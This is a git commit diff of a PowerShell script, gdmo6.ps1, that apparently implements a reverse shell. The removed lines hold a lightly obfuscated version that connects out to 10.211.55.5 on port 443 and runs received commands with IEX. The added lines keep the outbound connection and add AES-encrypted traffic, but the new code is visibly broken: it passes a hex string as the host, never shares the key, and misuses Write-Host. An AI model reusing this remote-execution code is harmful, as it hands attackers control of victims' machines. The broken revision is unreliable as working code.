2c04bc80fa790d34f8d48d2e124dcfc716a3948b
bisoestate-bit <bisoestate@gmail.com>
2026-08-11 03:18:27 -0700

    Update gdmo6.ps1

--- gdmo6.ps1
+++ gdmo6.ps1
@@ -1,40 +1,43 @@
 
 
+Add-Type -AssemblyName System.Security.Cryptography
+
 $X = 0x55 ^ 0xAA
-$IP = "10.211.55.5".ToCharArray()
-$P = [BitConverter]::ToString([byte[]]@(443 -shr 8, 443 % 256)).Replace("-", "") # Port 443
+$IP = [System.BitConverter]::ToString([byte[]]@(10, 211, 55, 5)).Replace("-", "")
+$P = 443
 
 
-Function D($a, $k) { return ($a | $k) -bxor $k }
-$Y = { param($s,$k) -join ($s | % { [char](($_ -bxor $k) -band 0xFF) }) }
+$TcpClient = New-Object System.Net.Sockets.TcpClient
+$TcpClient.Connect($IP, $P)
+$Stream = $TcpClient.GetStream()
+$Writer = New-Object System.IO.BinaryWriter($Stream)
+$Reader = New-Object System.IO.StreamReader($Stream)
 
 
-$DecIP = & $Y ($IP | % { [byte][char]$_ }, $X)
-$DecPort = [int]"0x$(& $Y ($P.ToCharArray(), $X))"
+$Key = New-Object byte[] 32
+$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+$rng.GetBytes($Key)
 
 
-$A = New-Object Net.Sockets.TcpClient
-$B = "Cl" + "ient"
-$C = "GetSt" + "ream"
-$D = "Bi" + "naryWriter"
-$E = "Stre" + "amReader"
-
-
-$A.$B().Connect($DecIP, $DecPort)
-$S = $A.$C()
-$W = New-Object IO.$D($S)
-$R = New-Object IO.$E($S)
+$aes = New-Object System.Security.Cryptography.AesManaged
+$aes.Key = $Key
+$aes.GenerateIV()
+$IV = $aes.IV
+$Stream.Write($IV, 0, $IV.Length)
 
 
 While ($true) {
-Try {
-        $CMD = $R.ReadLine()
-If ($CMD -eq "exit") { break }
-        IEX ($CMD | Out-String)
-        $W.WriteLine("> ")
-        $W.Flush()
+    Try {
+        $CMD = $Reader.ReadLine()
+        If ($CMD -eq "exit") { break }
+        $encryptedCMD = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($CMD), 0, $CMD.Length)
+        $Stream.Write($encryptedCMD, 0, $encryptedCMD.Length)
+        $encryptedResp = New-Object byte[] 4096
+        $bytesRead = $Stream.Read($encryptedResp, 0, $encryptedResp.Length)
+        $decryptedResp = $aes.CreateDecryptor().TransformFinalBlock($encryptedResp, 0, $bytesRead)
+        Write-Host [Text.Encoding]::ASCII.GetString($decryptedResp)
     } catch {
-        Start-Sleep -Seconds 1
-        $A.$B().Close()
+        $TcpClient.Close()
+        $Stream.Close()
     }
 }
